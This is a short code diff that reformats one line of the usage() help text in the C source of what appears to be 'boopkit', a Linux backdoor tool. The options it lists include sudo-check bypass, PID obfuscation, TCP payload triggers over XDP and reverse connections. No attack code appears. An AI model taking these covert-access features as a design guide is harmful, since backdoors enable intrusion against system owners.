@@ -50,7 +50,9 @@ void usage() {
   boopprintf("Options:\n");
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
-  boopprintf("-p, payload        Search XDP for TCP payload. No reverse connection.\n");
+  boopprintf(
+      "-p, payload        Search XDP for TCP payload. No reverse "
+      "connection.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
